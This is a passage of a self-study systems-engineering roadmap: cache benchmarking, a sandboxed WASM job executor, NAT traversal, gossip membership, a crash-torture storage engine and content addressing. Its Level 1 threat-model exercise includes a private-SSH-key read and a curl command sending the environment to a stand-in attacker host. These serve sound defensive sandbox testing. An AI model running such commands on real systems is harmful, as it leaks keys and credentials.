| **12** | Synthesis & Conversion | 49–52 | Aug 9 – Sep 5 | **S11** | — | 40 |

**Rest weeks: 13, 26, 39, 48** (10h, no new scope). **Buffer weeks: 22, 35, 43** (catch-up only; rest if on schedule).

---
---

# ⚡ LEVEL 0 — Machine, Memory & Measurement

> **Goal:** build the hardware mental model, and make every number you produce this year trustworthy.
> **⏱ Weeks 1–2 · 30h depth** · **Prereq:** none

## 0.1 — The memory hierarchy, measured on your own machine

> ### 🔥 THE WALL
> Two functions summing the same 4096×4096 `int32` matrix — row-major and column-major. **Identical Big-O, identical instruction count.** Column-major will be 5–60x slower.
>
> Then two `int64` counters in one struct, two threads incrementing one each, then padded onto separate 64-byte cache lines. **Same work, 3–10x throughput difference.**
>
> **You may not read on until both numbers are on your screen.**

### 🔎 DIAGNOSE
```bash
perf stat -e cache-references,cache-misses,L1-dcache-load-misses,LLC-load-misses ./bench
perf stat -e cpu-cycles,instructions ./bench       # IPC is the smoking gun
perf c2c record ./false_sharing_bench              # cache-to-cache: false sharing, visualised
lscpu | grep -i cache && numactl --hardware
```
Instruction counts nearly identical, IPC not. **Modern CPUs are memory-limited, not instruction-limited, and Big-O is silent about the thing that dominates.**

### 📖 THEORY
The latency ladder with numbers you measured · cache lines (64B: touching 1 byte costs 64) · spatial/temporal locality · AoS vs SoA · **false sharing and MESI** · why an uncontended atomic costs ~20ns and a contended one ~100ns+ · prefetching rescues sequential access and cannot rescue pointer chasing · TLB and huge pages · NUMA.

**Why this is Week 1 and not Week 30:** in Week 10 you build a storage engine, in Week 12 a content-addressed store hashing gigabytes, in Week 14 DHT routing tables. **Every one of those is a cache-layout decision, and you make them all with these numbers in front of you.**

### 📄 SOURCES
- **Bryant & O'Hallaron, *CS:APP* 3rd ed. — §6.2–6.4 only** (~40 pages). Skip §6.1.
- **Drepper, "What Every Programmer Should Know About Memory" — §3 in full**, §6.2–6.4. Skip §4–5.
- **Igor Ostrovsky, "Gallery of Processor Cache Effects"** — ten experiments, run all of them.
- **Colin Scott's interactive latency numbers** — note what changed over 20 years and what didn't.

### 🛠 CORE PROJECT — `latency-lab` *(Instrument, 8/10)* · 6h
A tool that measures the latency ladder of the machine it runs on and emits a personalised card: L1/L2/L3/DRAM, uncontended vs contended atomic, mutex, branch mispredict, NVMe 4K read, syscall, context switch, TCP loopback RTT. **Derive your cache sizes from a working-set sweep, without asking the OS.**

📈 **EXIT CRITERIA**
- [ ] Derived cache sizes match `lscpu` within one power of two — or you can explain why not
- [ ] Row-major vs column-major gap **explained by measured LLC-miss counts**, not asserted
- [ ] False-sharing fix ≥3x throughput, with `perf c2c` output committed
- [ ] A chart: working-set size (log x) vs ns/access, with the knees annotated
- [ ] You can recite the ladder in orders of magnitude in under 20 seconds

⛓ **PROBLEM CHAIN**
```
"Column-major is 40x slower"      → cache lines → your storage engine's page layout      (→ L3)
"Contended atomic is 5x"          → MESI → why the DHT routing table is read-mostly      (→ L4)
"Pointer chasing can't prefetch"  → why the Merkle DAG is laid out flat, not as nodes    (→ L3)
"DRAM is 78ns"                    → 50 nodes × their working sets on one box → the ceiling(→ 0.3)
"Syscall is 400ns"                → why the executor uses a pipe, not a syscall per job  (→ L1)
```

## 0.2 — Benchmark methodology: your numbers are lying to you

> ### 🔥 THE WALL
> Benchmark a trivial function five times. **The numbers differ by 15–40%.** Find out why, one cause at a time: frequency scaling, turbo, thermal throttling, ASLR changing alignment, thread migration, cold first iterations.
>
> Then build a **closed-loop** load generator (send the next request after the previous returns) and an **open-loop** one (fixed arrival rate regardless). Point both at a service that stalls 200ms once a second. **The closed-loop harness reports a beautiful p99. It is a lie.**

### 📖 THEORY
**Coordinated omission** — a closed-loop generator cannot measure the latency of requests it failed to send. When the service stalls, the generator stalls with it, and every request that *should* have arrived doesn't exist in the data.
**You cannot average percentiles.** The p99 of a job fanned out to 5 peers is roughly the p95 of a peer. **Tail latency multiplies under fan-out** — this is the whole of Level 7.
Warm-up, steady state, `benchstat`, ≥5 runs, report distributions.

**Reporting discipline for this repo:** every benchmark reports p50/p90/p99, peak RSS, **and the relevant hardware counter.** A latency number without one is not a result.

### 📄 SOURCES
- **Gil Tene, "How NOT to Measure Latency"** — in full, before you publish any benchmark this year.
- **Dean & Barroso, "The Tail at Scale", CACM 56(2), 2013** — eight pages.
- **Gregg, *Systems Performance* 2nd ed. — ch. 6 §6.6, ch. 13.** Reference.

### 🛠 CORE PROJECT — `bench/` + `sickbay` · 12h
The harness you use all year: fixed workloads, warm-up, percentiles, `perf stat` integration, **open-loop by default**, CI regression gate.
**`sickbay`:** 8 injectable pathologies in a container (memory leak, FD leak, lock contention, runaway syscall loop, disk saturation, CPU throttling under cgroup, DNS stall, goroutine leak) each with a hidden `SOLUTION.md` showing the *evidence* that reveals it.

📈 **EXIT CRITERIA**
- [ ] Two runs produce byte-identical result sets (fixed seeds, stable tie-breaking)
- [ ] Harness is **open-loop by default**; you can explain why in one paragraph
- [ ] CPU pinning and governor applied inside the harness
- [ ] A deliberate 5% regression is caught by `benchstat` in CI
- [ ] **`sickbay`: median diagnosis under 10 minutes across all 8, on a shuffled re-run**

> ⚠️ **You revisit this in Week 28 (F12).** If your harness turns out to have coordinated omission, you **re-run every benchmark** and put the before/after in `bench/RESULTS.md`. *"I found coordinated omission in my own harness and re-measured six months of results"* is one of the strongest sentences you can say in an interview.

## 0.3 — How big can your mesh actually be?

> ### 🔥 THE WALL
> Before any protocol work: **start 100 trivial Go processes**, each holding a 20MB heap and 50 open sockets, all gossiping randomly. Watch what breaks first — RAM, file descriptors, ephemeral ports, or the scheduler.
>
> **That number is the ceiling on your entire year of local testing**, and you need it in Week 2, not Week 30.

📈 **EXIT CRITERIA — `docs/SCALE-RISK.md`**
- [ ] Measured max concurrent `swarmd`-shaped processes on your box at realistic memory, with the binding resource named
- [ ] `ulimit -n`, `net.ipv4.ip_local_port_range`, and cgroup limits documented and tuned
- [ ] Oracle always-free instance provisioned; **NAT traversal from your Cairo connection to it verified working** (or the failure documented and a relay-only fallback chosen)
- [ ] **Signed, dated go/no-go on the simulator-first strategy**

## 🎓 LEVEL 0 EXIT EXAM
1. Recite the latency ladder in orders of magnitude. How many L1 hits fit in one DRAM access? One NVMe read?
2. You store a DHT routing table as an array of structs vs struct-of-arrays. For a lookup touching 8 entries, how many cache lines each?
3. Explain false sharing in four sentences, then the fix.
4. What is coordinated omission? Sketch a harness where a 200ms stall is invisible.
5. Why can't you average p99s across 5 peers? What do you do instead?
6. Your box runs 40 nodes and dies at 41. Name three possible binding resources and the command that identifies each.

**Pass = 5/6.**

**🔗 DSA companion (Track I W1–2):** arrays, hashing, prefix sums, two pointers, sliding window. **The cache-locality intuition you just built is *why* these patterns are fast in practice, not just in Big-O** — do them this week while that's fresh.

---
---

# ⚡ LEVEL 1 — The Executor: Running a Stranger's Code

> **Goal:** run untrusted code without it destroying the machine, and record what happened durably enough to survive a kill.
> **⏱ Weeks 3–4 · Sep 21 – Oct 4 2026 · 45h** · **Milestone S0** · **Fundamentals F2**
>
> **This is where SWARM stops being an ordinary distributed system.** Every other project in your corpus runs *your* code. This one runs code a stranger sent you. **Security fundamentals is 10.9% of your target postings, and this level is why yours will not be a recited answer.**

---

## 1.1 — What untrusted code does to you

> ### 🔥 THE WALL — run it naively, four ways
> Write a job runner that takes a submitted program and `exec`s it. Then submit four jobs, one at a time, and watch each one win:
> 1. **`cat ~/.ssh/id_rsa`** — it reads your private key and returns it as the "result."
> 2. **A memory bomb** — `malloc` in a loop. Your OOM killer picks a victim, and it may not be the job.
> 3. **`while(1);`** — one core pinned forever. No timeout fires because the process is *healthy*, just useless.
> 4. **`curl http://attacker/?d=$(env)`** — it exfiltrates your environment, including any cloud credentials on the box.
>
> **Every one of these works.** Screenshot all four. This is the threat model, and it is why the sandbox is not optional and not a checkbox.

### 🔎 DIAGNOSE
```bash
strace -f -e trace=file,network ./naive_runner job.bin   # what did it actually touch?
cat /proc/<pid>/limits                                    # what limits exist? (spoiler: none useful)
systemd-cgls / cat /sys/fs/cgroup/<slice>/memory.max      # what bounds memory?
```

### 📖 THEORY

- **Why WASM specifically, and not just containers.** A container is a *namespace* boundary, not a hypervisor — the kernel is still shared, and a kernel bug is a full escape. **WebAssembly is different in kind:** no ambient syscall access (capabilities are explicitly granted through WASI), a linear memory that cannot be addressed outside its bounds, and **fuel metering** — the runtime counts instructions and can stop execution at an exact count. **And crucially for SWARM: WASM execution is deterministic**, which means the same job on two honest peers produces bit-identical output. That property is the entire foundation of Level 8's trust layer. Choosing WASM is not a fashion decision; it's the thing that makes verification possible at all.
- **The layers, and why you use several.** WASM sandbox (memory + capability isolation, fuel limit) · **a separate OS process** (crash and memory domain isolation from `swarmd`) · **cgroups v2** (`memory.max`, CPU quota — the hard backstop if the runtime is compromised) · **seccomp** (syscall filter on the host process) · **no network capability granted by default**, and an explicit allowlist when a job needs one.
- **Defence in depth, stated as a design principle:** each layer assumes the one above it failed. Write this down — it's ADR material and it's how security people think.
- **Resource accounting** — you must know what a job *cost* (fuel consumed, peak memory, wall time), because Level 8 bills for it and Level 7 schedules on it.
- **The durable job log** — an append-only, checksummed record of job lifecycle transitions, fsynced before acknowledging. This is a minimal preview of the storage engine you build properly in Level 3, and building it small now means Level 3 is a rewrite you understand rather than a first attempt.

### 📄 SOURCES

- **Arpaci-Dusseau, *OSTEP* — ch. 4–7** (processes, the API, direct execution, scheduling). Free.
- **The WebAssembly specification, §2 (Structure) and §4 (Execution)** — skim for the execution model, specifically why linear memory bounds are checkable. **Plus the Wasmtime docs on fuel metering and WASI capabilities** — these are the two features you actually depend on.
- **Linux `cgroups` v2 documentation — the `memory` and `cpu` controllers.** Read the actual kernel doc, not a blog summary; you'll need `memory.max` vs `memory.high` precisely.
- **"Understanding and Hardening Linux Containers" (NCC Group)** — read the sections on namespace escape and why containers are not a security boundary. This is the document that will stop you from claiming your sandbox is stronger than it is.

### 🛠 MILESTONE S0 — the sandboxed executor + durable job log · 30h

`swarm-exec` (C++, using the Wasmtime C API) as a **separate process**, plus the job log.

📈 **EXIT CRITERIA**
- [ ] **All four wall attacks fail**, each with a test asserting the failure mode and the log entry
- [ ] A memory-bomb job is killed at its configured limit; **the host stays healthy and other jobs are unaffected** — verified by running one alongside three well-behaved jobs
- [ ] An infinite-loop job is terminated by **fuel exhaustion at a deterministic instruction count**, not by a wall-clock timeout. Run it twice: **the fuel count at termination is identical.**
- [ ] Network access is denied by default; a job granted an allowlist reaches only the allowed host, asserted by a test
- [ ] **Determinism check: the same job with the same input, run 100 times, produces a bit-identical output hash.** This is the property Level 8 depends on — verify it now, not then.
- [ ] Resource accounting per job: fuel consumed, peak memory, wall time, all recorded
- [ ] **`kill -9` mid-job, 500 cycles: the log is always recoverable, never corrupted, and never claims a job succeeded that didn't**
- [ ] `docs/design/threat-model.md` — **written, with the layers, what each assumes has already failed, and an honest statement of what you do NOT defend against** (a Wasmtime 0-day, a kernel escape from the host process, a malicious job that simply computes slowly to waste your money)

⛓ **PROBLEM CHAIN**
```
"The job read my SSH key"       → capability-based isolation → WASI → why not containers
"Timeout didn't stop the loop"  → wall-clock vs fuel metering → determinism             (→ L8 trust)
"Two runs gave different fuel"  → nondeterminism in the runtime → you can't verify results(→ L8)
"kill -9 corrupted the log"     → fsync, checksums, WAL → build it properly              (→ L3)
"How much did that job cost?"   → resource accounting → scheduling and billing           (→ L7, L8)
"What if Wasmtime has a bug?"   → defence in depth → cgroups as the backstop → threat model
```

## 🎤 INTERVIEW PARAGRAPH — Week 4

> I'm building a peer-to-peer distributed compute mesh — any machine joins, every node both submits jobs and executes jobs for others. Volunteer computing isn't new; BOINC has done it since 2002 and solved result verification with redundancy and credit. What I'm building is an open, benchmarked implementation, and the thing I want to measure is the tradeoff nobody publishes: how much redundant execution you need to trust a stranger's result, given their history. Right now I'm at the executor. The first thing I did was write the naive version and attack it — a job that reads your SSH key, a memory bomb, an infinite loop, and one that exfiltrates your environment. All four worked. So the executor is WASM now, in a separate process, with cgroups underneath as a backstop. The choice of WASM isn't fashion: it has no ambient syscall access, memory is bounds-checked by construction, and it has fuel metering, so I terminate an infinite loop at an exact instruction count rather than a wall-clock timeout. And **WASM execution is deterministic**, which is the property the whole trust layer depends on later — the same job on two honest peers produces a bit-identical output hash, so a peer that disagrees is either lying or broken. I verify that determinism with a hundred-run test now, because if it doesn't hold, nothing I build in month eight works.

## 🎓 LEVEL 1 EXIT EXAM
1. Why is a container not a security boundary? What is it good for?
2. Give three properties of WASM that make it suitable for untrusted code, and one thing it does not protect you from.
3. Fuel metering vs a wall-clock timeout. Why does SWARM need the former?
4. Your sandbox has four layers. For each, state what it assumes has already failed.
5. A job computes correctly but takes 100x longer than it should, wasting the executor's electricity. Which layer stops it? (Careful — this is a scheduling and economics problem, not a sandbox one.)
6. Why must job execution be deterministic, and what breaks in month eight if it isn't?

**Pass = 5/6.**

**🔗 DSA companion (W3–4):** binary search including **binary search on the answer** (fuel-limit calibration is literally this), and stack/monotonic-stack problems.

---
---

# ⚡ LEVEL 2 — Peer Communication

> **Goal:** peers find each other with no directory, across home routers, and detect each other's death without a central watcher.
> **⏱ Weeks 5–9 · Oct 5 – Nov 8 2026 · 90h** · **Milestone S1** · **Core: `c10k-arena`** · **Fundamentals F3, F4**

---

## 2.1 — Concurrency models, and the one your node daemon needs

> ### 🔥 THE WALL
> Write the dumbest possible peer server: `accept()` → spawn a thread → read/write loop. Point 10,000 connections at it.
>
> Watch it die, and note **how** — RAM exhaustion from 10k × 8MB default stacks, or `pthread_create: Resource temporarily unavailable`, or the scheduler burning 40% system CPU doing nothing but context switches. Then run it again with `ulimit -n 1024` and watch it fail in a completely different way. **Both failures teach different things.**

### 📖 THEORY
Process vs thread vs goroutine cost in bytes and microseconds · the Linux scheduler and cgroup CPU throttling · **context switch anatomy: the cache cost dwarfs the switch cost** · `select → poll → epoll → io_uring` · readiness (epoll) vs completion (io_uring) models · Go's G-M-P scheduler and why a blocking syscall doesn't stall the world · **file descriptors, `EMFILE` vs `ENFILE`** — which you already hit in Week 2.

### 📄 SOURCES
- **OSTEP — ch. 25–33** (concurrency). Free.
- **Dan Kegel, "The C10K Problem"** — read as an artifact of how the industry got here.
- **Evan Klitzke, "Blocking I/O, Nonblocking I/O, And Epoll"** — precise and short.
- **Jens Axboe, "Efficient IO with io_uring"** — the primary source.
- **William Kennedy (Ardan Labs), "Scheduling In Go"** — all three parts.

### 🛠 CORE PROJECT — `c10k-arena` *(Instrument, 9/10)* · 14h
The same echo server six ways — process-per-connection, thread-per-connection, bounded thread pool, single-threaded `epoll`, `io_uring`, goroutines — plus the harness benchmarking all six at 100 / 1k / 10k / 50k connections.

📈 **EXIT CRITERIA**
- [ ] All six pass an identical correctness test (echo integrity under concurrent load, no interleaving)
- [ ] Six-line chart: connections (log) vs p99 latency; second chart for RSS
- [ ] **You can state exactly where each model's knee is and name the resource that caused it**
- [ ] io_uring shows **measurably fewer syscalls per message** than epoll — with the number from `strace -c`
- [ ] Run under a cgroup CPU limit and show **how the ranking changes under throttling** — this is the Kubernetes reality and almost nobody benchmarks it
- [ ] **The written conclusion: which model `swarmd` uses and why.** (It will be goroutines. Have the numbers, don't assert the reasoning.)

## 2.2 — Two peers behind two home routers

> ### 🔥 THE WALL
> Run `swarmd` on your workstation in Cairo. Run another on a friend's machine, or a second network. Give each the other's IP. **They cannot connect, in either direction.**
>
> Both are behind NAT. Neither has a publicly routable address. **This is the actual, physical reason peer-to-peer software needs discovery and traversal infrastructure**, and it is invisible until you hit it. Now do it again with the Oracle box as a rendezvous point and watch hole punching work — and then find the NAT type where it *still* doesn't, and fall back to relay.

### 🔎 DIAGNOSE
```bash
tcpdump -i any -nn 'udp port 3478'      # watch the STUN exchange
ss -unp                                  # what does your side think the mapping is?
# then compare your observed external ip:port from two different rendezvous servers
# — if they differ, you're behind symmetric NAT and hole punching will not work
```

### 📖 THEORY
- **NAT types and why they matter:** full-cone, restricted-cone, port-restricted, **symmetric**. **Hole punching works for the first three and fails for symmetric NAT**, which is why every real P2P system has a relay fallback. Knowing this distinction is what separates someone who read about NAT from someone who fought it.
- **STUN-style discovery** — ask a public server what external `ip:port` your packet appeared to come from, then coordinate simultaneous outbound packets so both NATs open a mapping.
- **Relay fallback (TURN-shaped)** — when punching fails, proxy through your Oracle box. **Measure what fraction of your peer pairs need it**, because that fraction is a cost in a real system.
- **Why UDP first, TCP as fallback** — hole punching is far more reliable over UDP.
- **Your reliability layer.** If jobs and results ride over UDP you need ordering, retransmission and flow control yourself — or you use QUIC, which gives you all three plus TLS. **Decide and write the ADR.** *(Recommendation: QUIC via `quic-go`. Implementing your own reliable-UDP layer is a fascinating month you do not have. Note it in `docs/IDEAS.md` for 2028.)*

## 2.3 — Gossip: how a mesh knows who is in it

> ### 🔥 THE WALL
> Implement naive membership: every node pings every other node every second. Run 40 nodes.
>
> **Traffic grows as O(N²).** At 40 nodes that's 1,600 pings/second and it still works. Extrapolate to 1,000 nodes: a million pings/second, and every node's CPU is spent on membership rather than jobs. **Plot the traffic curve and put the extrapolation next to it** — that curve is why gossip exists.
>
> Then the harder wall: **partition the network asymmetrically** — A's packets reach B, B's do not reach A. Watch your failure detector produce a permanently inconsistent view of the mesh where A thinks B is alive and B thinks A is dead. **Every naive liveness check gets this wrong, and it is how split-brain happens in the real world.**

### 📖 THEORY
- **SWIM** — a node pings one random peer per protocol period; on failure it asks *k* other peers to ping on its behalf (indirect probing, which is what makes it robust to a single bad link); membership updates piggyback on the ping traffic itself, so dissemination costs nothing extra. **Traffic is O(N) per node per period regardless of mesh size.**
- **Phi-accrual failure detection** — instead of a binary alive/dead with a fixed timeout, output a *suspicion level* from the distribution of recent inter-arrival times. Adapts to a peer on a bad link instead of flapping. **Compare it to a fixed timeout and measure the false-positive rate under jitter** — that comparison is your artifact.
- **Suspicion mechanism** — SWIM marks a peer *suspect* before *dead*, giving it a window to refute. This is what stops a momentary GC pause from evicting a healthy node.
- **Incarnation numbers** — how a node refutes a false death rumour without an authority to appeal to.

### 📄 SOURCES
- **Das, Gupta, Motivala, "SWIM: Scalable Weakly-consistent Infection-style Process Group Membership Protocol", DSN 2002.** The paper. Read it fully; it's short and unusually clear.
- **Hayashibara et al., "The φ Accrual Failure Detector", SRDS 2004.**
- **DDIA ch. 8** in full — partial failure, unreliable networks, unreliable clocks, **and why you cannot distinguish "slow" from "dead."** This chapter is the theoretical spine of everything in SWARM.
- **HashiCorp's Serf documentation on their SWIM extensions (Lifeguard)** — a production system's honest account of where the paper needed fixing.

### 🛠 MILESTONE S1 — the peer wire protocol · 40h

`swarm-core/codec` (C++), `swarmd/gossip`, `swarmd/transport`, `swarm-relay` (Go), `swarmd/gateway` (Go).

📈 **EXIT CRITERIA**
- [ ] **Two peers behind different NATs discover each other and exchange a job and a result.** If your connection is symmetric-NAT, demonstrate the relay fallback instead and **document which it was** — that's a real finding, not a failure.
- [ ] **Fraction of peer pairs requiring relay, measured** on your actual network conditions
- [ ] A peer joining a 40-node mesh is known to all others **within a bounded number of gossip rounds — measured, plotted against mesh size**
- [ ] A silent peer is detected dead **within a bounded window, with the false-positive rate measured under injected jitter** (`tc netem delay 50ms 30ms distribution normal`)
- [ ] **Phi-accrual vs fixed-timeout comparison: false-positive rate and detection latency, both, as a chart**
- [ ] **The asymmetric-partition test:** A reaches B, B doesn't reach A. **The mesh converges to a consistent view, or you document exactly why it can't and what you do about it.**
- [ ] Membership traffic per node is **flat as mesh size grows** — the chart, next to the naive O(N²) curve
- [ ] Wire protocol has an explicit versioning scheme; **an old peer and a new peer interoperate**, asserted by a test with a pinned old binary
- [ ] `swarm-relay` deployed on the Oracle box, publicly reachable, **$0.00**

⛓ **PROBLEM CHAIN**
```
"Peers can't connect"           → NAT types → hole punching → relay fallback → cost
"O(N²) membership traffic"      → gossip → SWIM → indirect probing
"Fixed timeout flaps under jitter"→ phi-accrual → suspicion levels
"A thinks B dead, B thinks A alive"→ asymmetric partition → THE nastiest fault class    (→ L6 sim)
"GC pause evicted a healthy node"→ suspicion mechanism → incarnation numbers
"Old peers broke on my new field"→ wire versioning → compatibility tests                 (→ L11 API)
"Who do I gossip to first?"     → bootstrap → the relay is a single point of failure     → say so
```

## 🎤 INTERVIEW PARAGRAPH — Week 9

> The mesh has real peer communication now, and two things surprised me. The first is that peer-to-peer is *physically* hard before it's algorithmically hard — two nodes behind home routers cannot connect in either direction, and I had to implement STUN-style hole punching with a rendezvous server, plus a relay fallback, because hole punching simply does not work behind symmetric NAT. I measured what fraction of my peer pairs need the relay, because that's a real cost. The second is membership. I started with everyone pinging everyone, which works fine at forty nodes and is O(N²) — I plotted it and extrapolated to a thousand nodes, where every node would spend its CPU on membership instead of jobs. So it's SWIM now: each node pings one random peer per period and asks k others to probe indirectly if that fails, with membership updates piggybacked on the ping traffic. Traffic per node is flat as the mesh grows and I have the chart. The failure detector is phi-accrual rather than a fixed timeout, which I chose after measuring false-positive rates under injected network jitter — a fixed timeout flaps badly. And the fault that taught me the most is the asymmetric partition: A's packets reach B but B's don't reach A. A naive liveness check produces a permanently inconsistent view where each node believes something different about the other, and that's the shape of how split-brain actually happens.

## 🎓 LEVEL 2 EXIT EXAM
1. Four NAT types. Which defeats hole punching, and what do you do instead?
2. Why is SWIM's traffic O(N) per node when naive membership is O(N²)? What does indirect probing buy you?
3. Fixed timeout vs phi-accrual. Give the failure mode of each and the metric that distinguishes them.
4. A 2-second GC pause makes a healthy node look dead. What in SWIM prevents eviction, and how does the node refute it?
5. Asymmetric partition: A→B works, B→A doesn't. What does each side believe? What can you actually do?
6. You cannot distinguish "slow" from "dead." State the consequence for SWARM's job re-execution policy.
7. Why UDP/QUIC rather than TCP for peer transport?

**Pass = 6/7.**

**🔗 DSA companion (W5–9):** **graph BFS/DFS — gossip propagation *is* breadth-first traversal over a graph.** This is the cleanest DSA-to-systems mapping in the whole roadmap; do LeetCode's graph-traversal set alongside this level specifically. Plus linked lists, trees, heaps, and design problems (LRU cache, rate limiter).

---
---

# ⚡ LEVEL 3 — Storage & Content Addressing

> **Goal:** a storage engine that survives being killed, and a content-addressed store where identity *is* the hash — the property that makes tampering detectable and deduplication free.
> **⏱ Weeks 10–13 · Nov 9 – Dec 6 2026 · 65h** · **Milestones S2, S3** · **🚩 Flagship #1: `crashdb`** · **⚑ CV v1** · **W13 = REST WEEK** · **Fundamentals F5, F6**

---

## 3.1 — 🚩 FLAGSHIP #1: `crashdb` — the engine and the adversary

> ### 🔥 THE WALL — the torn write
> Build the simplest durable store: append `key,value` to a file, keep an in-memory hashmap of key → offset. **Now `kill -9` it mid-write. Restart. Is the data correct?** Do it 500 times with random kill timing.
>
> You will find: truncated records · records that parse but are garbage · an index pointing past EOF · and the nastiest — **records that look valid but are half-old, half-new.**
>
> Then discover, in order:
> - **`write()` returning success means nothing was persisted.** It's in the page cache.
> - **`fsync()` is what persists**, and costs ~100µs on NVMe.
> - **On some filesystems a failed `fsync` marks the pages clean anyway** — so retrying `fsync` after an error can silently lose your data. That's "fsyncgate," and it hit PostgreSQL. **You cannot retry an fsync failure; you must treat it as fatal.**

### 📖 THEORY
- **B-Trees vs LSM-Trees and the RUM conjecture** — you may optimise two of Read amplification, Update amplification and Memory; never all three. State which two you chose for SWARM's job log and content index, and why.
- **WAL** — redo logging, group commit, checkpointing, and the durability/latency dial (`fsync` per write vs group commit vs none). **Measure all three.**
- **Checksums and framing** — every record carries a CRC and a length; a torn tail is detected, not parsed.
- **Bloom filters** — skip a segment without reading it. Report the configured false-positive rate and the measured disk-read reduction.
- **Compaction** — and why it causes latency spikes you must budget background I/O for.
- **MVCC and transaction isolation** *(via F6)* — you need this vocabulary for Level 11's `prefs` store, and for understanding what your engine does *not* provide.

### 📄 SOURCES
- **Kleppmann, *DDIA* — ch. 3 in full.** Read it twice; the second time after the project.
- **Petrov, *Database Internals* — ch. 2–4** (B-trees), **ch. 5** (transaction processing, recovery, WAL/ARIES conceptually). Part I is the best treatment of storage engines in print. Skip Part II.
- **"Bitcask: A Log-Structured Hash Table for Fast Key/Value Data"** (Riak) — 6 pages, your v1 target.
- **CMU 15-445 lectures 3–7** — buffer pool, hash tables, B+Trees, index concurrency. **Reference material, consulted when stuck. Not a course to complete.**
- **Rebello et al., "Can Applications Recover from fsync Failures?"** + the PostgreSQL fsyncgate mailing-list thread.
- **Athanassoulis et al., "The RUM Conjecture."**

### 🛠 THE BUILD · 30h

**The engine (v1→v5):** append log + in-memory index → CRC framing and partial-tail recovery → compaction with hint files → Bloom filter per segment → WAL + checkpointed recovery.

**`crashdb-torture` — the adversary, and the reason this scores 9/10:**
- Random workload while `kill -9`ing at random intervals
- **After every restart, verify four invariants:** every acknowledged write is present · no unacknowledged write is present · no key has a torn or garbage value · the index never points outside the file
- **Syscall-level fault injection via `LD_PRELOAD`:** `write()` succeeds but writes only half · `fsync()` returns `EIO` · the file is truncated at a random offset
- 1,000 cycles in CI

📈 **EXIT CRITERIA**
- [ ] **1,000 random-kill cycles, zero invariant violations**
- [ ] **Torn-write injection caught by checksums 100% of the time** — and you keep the pre-CRC branch to show a failing case
- [ ] Throughput: `fsync`-per-write vs group commit vs no-fsync, all three measured, **with a written argument for which SWARM ships and why**
- [ ] Bloom filter measurably reduces disk reads for missing keys, with the configured and *measured* false-positive rate
- [ ] Compaction's background I/O cost measured, and its effect on p99 during a compaction shown
- [ ] **`docs/design/durability-contract.md`: what this engine guarantees and what it does not.** A real durability contract, in the language of DDIA ch. 3.

> **Why this is a flagship and "build a KV store" isn't:** thousands of people have written Bitcask. **Almost nobody writes the torture harness.** The harness is the senior artifact — it demonstrates that correctness is something you *prove*, not assume.

## 3.2 — Milestone S2: the hexagonal core and the injectable universe

> ### 🔥 THE WALL
> Try to write a test that asserts: *"if a peer accepts a job, then goes silent for 40 seconds, the job is re-assigned exactly once."*
>
> **You cannot, in under 40 seconds of real time, without real network and real sleeps** — and the test will be flaky forever. Now try to test what happens if the clock jumps backwards mid-lease. **You cannot at all.**
>
> **This is the wall that forces the architecture**, and it is the single highest-leverage refactor in the year: it is what makes Level 6's simulation possible.

### 📖 THEORY
Hexagonal / ports-and-adapters · **every source of nondeterminism becomes an injectable port**: clock, network, disk, sandbox, random. · **SOLID reframed by the pain each principle prevents**, and the counterweight — *"duplication is far cheaper than the wrong abstraction"* (Sandi Metz) and **deep modules beat many shallow ones** (Ousterhout). · Structured concurrency and **bounded queues as a mandatory design rule**: every queue has a maximum size and a written full-queue policy.

### 📄 SOURCES
- **Ousterhout, *A Philosophy of Software Design*** — short, sharp, and it contradicts parts of *Clean Code* while being more right.
- **Nathaniel J. Smith, "Notes on structured concurrency, or: Go statement considered harmful"** — changes how you think about spawning anything.

📈 **EXIT CRITERIA — S2**
- [ ] The scheduling and job-lifecycle core has **zero imports** of network, disk, sandbox or wall-clock packages — **enforced in CI** by a dependency linter, with a screenshot of a rejected violation PR
- [ ] **Full core test suite runs in under 2 seconds** with no Docker, no network, no real time
- [ ] **You can advance the clock by 40 seconds in a test in microseconds** — and the "silent peer, re-assigned exactly once" test passes deterministically
- [ ] Swapping the sandbox implementation (WASM ↔ subprocess) is a **one-line change** in composition root
- [ ] Every queue in the system has a maximum size and a documented full policy

## 3.3 — Milestone S3: content addressing — identity *is* the hash

> ### 🔥 THE WALL
> Two peers each store "the same" job artifact under a filename. One has a stale version. **Under a name-based scheme they diverge silently and there is no way to detect it** — a job runs against the wrong code and returns a plausible wrong answer.
>
> Now the second wall: store a 500MB artifact. Change one byte in the middle. **Under naive whole-file hashing you re-transfer all 500MB.** Implement fixed-size chunking. Now *insert* one byte at the front and watch **every chunk boundary shift** — you re-transfer all 500MB again. **That's why content-defined chunking exists**, and you will not forget it.

### 📖 THEORY
- **Content addressing** — an artifact's key is a cryptographic hash of its content. Identical content → identical address, always. **Tampering is detectable on retrieval by construction**, and deduplication is free. **This is also the mechanism that makes Level 8's verification work:** two honest peers running the same deterministic job produce the same output hash.
- **Content-defined chunking (Rabin fingerprinting / rolling hash)** — chunk boundaries determined by content, not offset, so an insertion shifts only the local chunk. **Real DSA:** a rolling hash over a sliding window, cut when the low bits hit a pattern. Measure the chunk-size distribution and the dedup ratio against fixed-size chunking on a realistic edit workload.
- **Merkle DAG** — large artifacts as a tree of chunk hashes; the root hash names the whole thing; any subtree is independently verifiable. Enables partial fetch and parallel transfer from multiple peers.
- **Hash choice** — BLAKE3 (fast, tree-structured, SIMD-friendly, parallelisable) vs SHA-256 (ubiquitous, slower). **Benchmark both on your machine and pick with the number in front of you.** BLAKE3's tree structure composes naturally with a Merkle DAG, which is an argument beyond raw speed.
- **Garbage collection** — reference counting vs mark-and-sweep over the DAG, **under concurrent access.** This is where the subtle bug lives: collecting an artifact that a concurrent job just referenced.
- **Replication and placement** — how many copies, where, and who repairs when a peer holding one leaves. (Placement lands properly in Level 4 with the DHT.)

### 📄 SOURCES
- **Benet, "IPFS — Content Addressed, Versioned, P2P File System"** — the content-addressing and Merkle DAG model.
- **Muthitacharoen, Chen, Mazières, "A Low-bandwidth Network File System" (SOSP 2001)** — the origin of content-defined chunking. Short, and the idea is beautiful.
- **The BLAKE3 specification and paper** — read §2 for the tree structure specifically.
- **DDIA ch. 3** as the storage foundation underneath it all.

### 🛠 THE BUILD · 22h — `swarm-core/cas` (C++)

📈 **EXIT CRITERIA**
- [ ] **Identical content resolves to an identical address across 10,000 random artifacts** — property-tested
- [ ] **A tampered artifact is detected on retrieval and never silently served** — asserted by a test that flips one bit
- [ ] **Content-defined vs fixed chunking**: dedup ratio on an edit workload (insert at front, modify middle, append), as a chart. **The front-insertion case is the whole point** — show fixed-size chunking's total failure next to CDC's near-perfect dedup.
- [ ] Chunk-size distribution plotted; average within 20% of target
